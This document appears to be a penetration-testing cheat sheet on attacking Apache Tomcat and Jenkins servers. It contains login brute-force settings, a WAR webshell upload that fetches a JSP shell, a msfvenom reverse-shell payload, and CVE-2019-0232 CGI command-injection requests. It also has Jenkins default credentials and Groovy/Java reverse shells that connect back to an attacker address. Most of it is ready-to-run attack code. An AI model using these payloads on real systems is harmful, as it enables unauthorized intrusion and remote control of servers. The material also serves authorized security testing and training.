# Servlet Containers / Software Development

In this section, we will discuss the following technologies:
- Tomcat
- Jenkins

## Tomcat

### Discovery & Enumeration

````
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
-----------------------------------------------------------------------
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class
````
Version
````
http://<domain>:8080/invalid
$ curl -s http://<domain>:8080/docs/ | grep Tomcat
````

Directories
````
$ gobuster dir -u http://<domain>:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
````

**Login Brute Force**
````
Metasploit
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST <domain>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT <server_port>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts <server_ip>

PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt
USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
````
````
mgr_brute.py
$ python3 mgr_brute.py -U http://<domain>:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
````

### Code Execution

**War File Upload**
````
1- /manager/html
$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
$ zip -r backup.war cmd.jsp
4 - Browser > Select backup.war > deploy
$ curl http://<domain>:8180/backup/cmd.jsp?cmd=id
````
````
Metasploit
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Our_IP> LPORT=<Our_PORT> -f war > backup.war
$ nc -lnvp 4443
or
multi/http/tomcat_mgr_upload
````

### Tomcat CGI

CVE-2019-0232 is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the enableCmdLineArguments feature enabled. Versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 of Tomcat are affected.

**Enumeration**
````
$ nmap -p- -sC -Pn 10.129.204.227 --open 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:57 SAST
Nmap scan report for 10.129.204.227
Host is up (0.17s latency).
Not shown: 63648 closed tcp ports (conn-refused), 1873 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   2048 ae19ae07ef79b7905f1a7b8d42d56099 (RSA)
|   256 382e76cd0594a6e717d1808165262544 (ECDSA)
|_  256 35096912230f11bc546fddf797bd6150 (ED25519)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8009/tcp  open  ajp13
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
47001/tcp open  winrm
````
**Finding a CGI script**
````
$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<server_ip>:8080/cgi/FUZZ.cmd
$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<server_ip>:8080/cgi/FUZZ.bat
````
**Exploitation**
````
$ curl http://<server_ip>:8080/cgi/welcome.bat?&dir
$ curl http://<server_ip>:8080/cgi/welcome.bat?&set
$ curl http://<server_ip>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
````

## Jenkins

Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is used to communicate between masters and slaves. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.

**Enumeration**
````
http://<domain>:8000/configureSecurity/
Default Creddentials -> admin:admin
````

**Code Execution**

Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the Script Console. 
````
http://<domain>:8000/script
````

Single Command - Linux
````
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
````

Single Command - Windows
````
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
````

Linux - Reverse Shell
````
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<Our_IP>/<Our_Port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
````

Windows - Reverse Shell
````
String host="<Our_IP>";
int port=<Our_Port>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
````
